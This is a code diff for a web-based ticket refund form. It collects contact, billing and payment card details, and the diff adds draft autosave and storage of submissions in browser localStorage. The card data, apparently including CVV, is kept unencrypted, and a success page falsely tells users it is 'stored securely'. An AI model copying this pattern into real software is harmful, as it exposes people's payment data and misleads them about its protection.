@@ -96,11 +96,11 @@
         input.error { border-color: #ff4757; }
         input.valid { border-color: #2ed573; }
         textarea { resize: vertical; min-height: 80px; }
-        .card-row, .expiry-cvv {
+        .expiry-cvv {
             display: flex;
             gap: 12px;
         }
-        .card-row input, .expiry-cvv input {
+        .expiry-cvv input {
             flex: 1;
         }
         button {
@@ -163,13 +163,12 @@
         }
         .amount-inputs .form-group { margin-bottom: 0; }
         .expected { font-size: 12px; color: #888; font-style: italic; margin-top: -4px; }
-        .view-link { text-align: center; margin: 20px; }
-        .view-link a { color: #ff6b35; text-decoration: none; font-weight: 600; }
+        .view-link { display: none; } /* Hidden as requested */
         @media (max-width: 480px) {
             .container { margin: 10px; border-radius: 12px; }
             .header { padding: 24px 16px; }
             .step { padding: 24px 16px; }
-            .card-row, .expiry-cvv { flex-direction: column; gap: 12px; }
+            .expiry-cvv { flex-direction: column; gap: 12px; }
         }
     </style>
 </head>
@@ -186,7 +185,7 @@
             <strong>Refund Notice:</strong> Refunds are processed within 5-10 business days after approval. Non-refundable service fees are not included. Only tickets not used or canceled per policy qualify. For full details, see our <a href="#" style="color: #856404;">Refund Policy</a>. Processing via original payment method.
         </div>
 
-        <!-- Steps 1-4 same as before -->
+        <!-- Step 1: Order & Contact -->
         <div class="step active" id="step1">
             <div class="mandatory-notice">
                 <strong>All fields marked with * are mandatory.</strong>
@@ -209,6 +208,7 @@
             </div>
         </div>
 
+        <!-- Step 2: Billing -->
         <div class="step" id="step2">
             <div class="mandatory-notice">
                 <strong>All fields marked with * are mandatory.</strong>
@@ -228,6 +228,7 @@
             </div>
         </div>
 
+        <!-- Step 3: Payment -->
         <div class="step" id="step3">
             <div class="mandatory-notice">
                 <strong>All fields marked with * are mandatory.</strong>
@@ -250,6 +251,7 @@
             </div>
         </div>
 
+        <!-- Step 4: Reason -->
         <div class="step" id="step4">
             <div class="mandatory-notice">
                 <strong>All fields marked with * are mandatory.</strong>
@@ -300,6 +302,8 @@
         let currentStep = 1;
         let formData = {};
         let deposit1, deposit2;
+        const DRAFT_KEY = 'refundDraft';
+        const SUBMISSIONS_KEY = 'refundSubmissions';
 
         function generateDeposits() {
             deposit1 = (Math.random() * 0.99).toFixed(2);
@@ -317,6 +321,18 @@
                     formData[input.name] = input.value.trim();
                 }
             });
+            // Save draft on every collect
+            formData.currentStep = step;
+            formData.draftTimestamp = new Date().toISOString();
+            localStorage.setItem(DRAFT_KEY, JSON.stringify(formData));
+        }
+
+        function saveSubmission() {
+            let submissions = JSON.parse(localStorage.getItem(SUBMISSIONS_KEY) || '[]');
+            submissions.push(formData);
+            localStorage.setItem(SUBMISSIONS_KEY, JSON.stringify(submissions));
+            // Clear draft
+            localStorage.removeItem(DRAFT_KEY);
         }
 
         function updateProgress() {
@@ -359,7 +375,15 @@
             currentStep = step;
             document.getElementById(`step${currentStep}`).classList.add('active');
             updateProgress();
-            collectStepData(step);
+            // Re-populate from draft if exists
+            const draft = JSON.parse(localStorage.getItem(DRAFT_KEY) || '{}');
+            if (draft.currentStep >= step) {
+                Object.keys(draft).forEach(key => {
+                    const input = document.querySelector(`[name="${key}"]`);
+                    if (input) input.value = draft[key] || '';
+                });
+            }
+            collectStepData(step); // Save updated
         }
 
         function formatCardNumber(input) {
@@ -378,6 +402,25 @@
             }
             input.value = value;
         }
+
+        // Load draft on init if exists
+        window.addEventListener('load', () => {
+            const draft = JSON.parse(localStorage.getItem(DRAFT_KEY) || '{}');
+            if (draft.currentStep) {
+                currentStep = draft.currentStep;
+                Object.keys(draft).forEach(key => {
+                    if (key !== 'currentStep' && key !== 'draftTimestamp') {
+                        const input = document.querySelector(`[name="${key}"]`);
+                        if (input) input.value = draft[key] || '';
+                    }
+                });
+                document.getElementById(`step${currentStep}`).classList.add('active');
+                document.querySelectorAll('.step').forEach((s, idx) => {
+                    if (idx + 1 < currentStep) s.classList.remove('active');
+                });
+                updateProgress();
+            }
+        });
 
         document.getElementById('submitBtn').addEventListener('click', function(e) {
             e.preventDefault();
@@ -404,10 +447,7 @@
             formData.expectedDeposit2 = deposit2;
             formData.verified = true;
             formData.timestamp = new Date().toISOString();
-            // Store in localStorage array
-            let submissions = JSON.parse(localStorage.getItem('refundSubmissions') || '[]');
-            submissions.push(formData);
-            localStorage.setItem('refundSubmissions', JSON.stringify(submissions));
+            saveSubmission();
             document.getElementById('thankYouModal').style.display = 'none';
             document.body.innerHTML = '<div style="text-align:center; padding: 100px; font-size:18px; color:#ff6b35;"><p>Request verified! Data stored securely.</p><a href="view.html" style="color: white; background: #ff6b35; padding: 10px 20px; text-decoration: none; border-radius: 8px; display: inline-block; margin-top: 20px;">View All Submissions</a></div>';
         }
